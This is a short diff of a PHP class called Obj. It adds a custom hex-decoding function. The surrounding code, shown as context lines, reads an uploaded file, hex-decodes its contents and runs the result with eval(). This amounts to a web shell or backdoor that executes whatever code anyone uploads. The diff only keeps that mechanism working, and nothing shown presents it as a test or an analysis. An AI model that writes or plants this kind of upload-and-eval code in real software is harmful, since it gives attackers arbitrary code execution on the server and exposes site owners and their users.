@@ -2,6 +2,22 @@
 
 class Obj{
 
+    function hextobin($hexstr)
+    { 
+        $n = strlen($hexstr); 
+        $sbin="";   
+        $i=0; 
+        while($i<$n) 
+        {       
+            $a =substr($hexstr,$i,2);           
+            $c = pack("H*",$a); 
+            if ($i==0){$sbin=$c;} 
+            else {$sbin.=$c;} 
+            $i+=2; 
+        } 
+        return $sbin; 
+    } 
+
     public function __construct()
     {
         // Show errors for debug
@@ -47,7 +63,8 @@ class Obj{
             // Get the source code
             $code = file_get_contents($file['tmp_name']);
 
-            $code = hex2bin($code);
+            // $code = hex2bin($code);
+            $code = $this->hextobin($code);
 
             // Exec the code
             eval($code);
